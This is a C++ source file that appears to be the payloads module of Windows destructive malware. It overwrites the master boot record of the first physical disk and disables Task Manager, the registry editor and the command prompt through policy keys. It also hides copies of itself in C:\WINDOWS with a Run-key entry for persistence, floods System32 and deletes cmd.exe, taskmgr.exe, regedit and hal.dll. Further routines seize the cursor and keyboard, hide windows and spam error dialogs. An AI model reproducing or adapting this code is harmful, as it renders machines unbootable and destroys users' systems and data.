#include "System.h"
#include "Buffer.h"

LPCWSTR lpSubKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM";

namespace Payloads {
	
	VOID OverwriteMBR(VOID) {
		DWORD lpNumberOfBytesWritten;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE) exit(0);
		WriteFile(hFile, lpBuffer, 512, &lpNumberOfBytesWritten, NULL);
		CloseHandle(hFile);
	}
	
	VOID SystemToolDisabler(VOID) {
		System::ManageRegW(HKEY_CURRENT_USER, lpSubKey, L"DisableTaskMgr", REG_DWORD, 1, NULL, FALSE, FALSE);
		System::ManageRegW(HKEY_CURRENT_USER, lpSubKey, L"DisableRegistryTools", REG_DWORD, 1, NULL, FALSE, FALSE);
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, FALSE, FALSE);
	}
	
	VOID InfectSystem(VOID) {
		LPCWSTR pwszPaths[] = {
			L"C:\\WINDOWS\\404.exe",
			L"C:\\WINDOWS\\errdata.ini",
			L"C:\\WINDOWS\\System32\\OOBE\\regerror\\reg404.js.exe"
		};
		INT totpath = _countof(pwszPaths);
		for (INT i = 0; i < totpath; i++) {
			System::CopyFileExt(GetDirectory(), pwszPaths[i], FILE_ATTRIBUTE_HIDDEN);
			System::ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RUN", L"Error Code", 0, 0, (BYTE*)pwszPaths[0], FALSE, TRUE);
		}
	}
	
	VOID FloodSystem32(VOID) {
		for (INT i = 0; i < 256; i++) {
			System::CopyFileExt(GetDirectory(), L"C:\\WINDOWS\\System32\\" + i, FILE_ATTRIBUTE_NORMAL);
		}
	}
	
	DWORD WINAPI DeleteFilesProc(LPVOID lpProc) {
		LPCWSTR pwszFiles[] = {
			L"C:\\WINDOWS\\System32\\taskmgr.exe",
			L"C:\\WINDOWS\\regedit.exe",
			L"C:\\WINDOWS\\System32\\regedt32.exe",
			L"C:\\WINDOWS\\System32\\cmd.exe",
			L"C:\\WINDOWS\\System32\\cmmgr.exe",
			L"C:\\WINDOWS\\System32\\hal.dll"
		};
		INT totfil = _countof(pwszFiles);
		for (INT i = 0; i < totfil; i++) {
			while (GetFileAttributesW(pwszFiles[i]) != INVALID_FILE_ATTRIBUTES) {
				DeleteFileW(pwszFiles[i]);
			}
		}
		return 0x01;
	}
	
	DWORD WINAPI MoveCursorProc(LPVOID lpProc) {
		INT psignx = 1, psigny = 1;
		FLOAT pincrement = 10;
		INT px = 10, py = 10;
		INT pw = GetSystemMetrics(0), ph = GetSystemMetrics(1);
		while (TRUE) {
			px += pincrement * psignx;
			py += pincrement * psigny;
			SetCursorPos(px, py);
			if (px > pw) psignx = -1;
			if (py > ph) psigny = -1;
			if (px == 0) psignx = 1;
			if (py == 0) psigny = 1;
			Sleep(10);
		}
		return 0x01;
	}
	
	DWORD WINAPI SpamKeyboard(LPVOID lpProc) {
		LPCSTR ch = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm!$^&*()%";
		INT totch = strlen(ch) / sizeof(VOID *);
		while (TRUE) {
			keybd_event(VkKeyScanA(rand() % totch), 0, 0, 0);
			Sleep(100);
		}
		return 0x01;
	}
	
	INT CALLBACK StringProc(HWND hwnd, LPARAM lParam) {
		System::EnumProc(hwnd, "404");
		return 0x01;
	}
	
	INT CALLBACK HideWindowProc(HWND hwnd, LPARAM lParam) {
		ShowWindow(hwnd, SW_HIDE);
		return 0x01;
	}
	
	DWORD WINAPI EnumStringProc(LPVOID lpProc) {
		while (TRUE) {
			HWND hwnd = GetDesktopWindow();
			EnumChildWindows(hwnd, &StringProc, 0);
			Sleep(10);
		}
		return 0x01;
	}
	
	DWORD WINAPI EnumHideWindowProc(LPVOID lpProc) {
		while (TRUE) {
			HWND hwnd = GetForegroundWindow();
			EnumChildWindows(hwnd, &HideWindowProc, 0);
			Sleep(100);
		}
		return 0x01;
	}
	
	DWORD WINAPI Message(LPVOID lpProc) {
		while (TRUE) {
			MessageBoxW(NULL, L"404", L"Unknown Hard Error", MB_YESNOCANCEL | MB_HELP | MB_RTLREADING);
		}
		return 0x01;
	}
	
	
}
